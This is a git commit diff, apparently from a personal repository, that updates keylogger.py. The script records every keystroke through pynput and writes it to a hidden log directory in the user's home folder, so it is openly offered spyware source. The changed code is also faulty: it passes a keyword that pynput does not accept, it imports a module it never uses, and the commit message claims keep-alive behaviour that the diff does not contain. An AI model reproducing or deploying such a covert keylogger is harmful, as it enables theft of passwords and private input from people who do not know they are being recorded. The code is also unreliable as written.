64937b88fc748de749df9bf94814500f0421828d
BlackHatHackerOSU <130389151+BlackHatHackerOSU@users.noreply.github.com>
2024-03-10 07:20:56 +0000

    Final + KeepAlive

--- keylogger.py
+++ keylogger.py
@@ -1,26 +1,28 @@
 from pynput.keyboard import Listener
 import os
+import time
 
 # Path to save the log file, hidden in the user's home directory
-log_file_path = os.path.expanduser('~/.hidden_keylog.txt')
 
-def on_press(key):
-    try:
-        with open(log_file_path, 'a') as f:
-            f.write(f'{key.char}')
-    except AttributeError:
+logDirectory = os.path.expanduser('~') + '/.hidden_logs'
+if not os.path.exists(logDirectory):
+    os.makedirs(logDirectory)
+logFilePath = os.path.join(logDirectory, 'keystroke.log')
+
+def onPress(key):
+    with open(logFilePath, 'a') as logFile:
+        try:
+            logFile.write(f"{key.char}")
+        except AttributeError:
         # Special keys
-        if key == key.space:
+            if key == key.space:
             # Write a space to the file instead of 'Key.space'
-            with open(log_file_path, 'a') as f:
-                f.write(' ')
-        else:
-            # For other special keys, write their name
-            with open(log_file_path, 'a') as f:
-                f.write(f' {key} ')
+                logFile.write(" ")
+            else:
+                logFile.write(f" {key} ")
 
 def main():
-    with Listener(on_press=on_press) as listener:
+    with Listener(onPress=onPress) as listener:
         listener.join()
 
 if __name__ == '__main__':
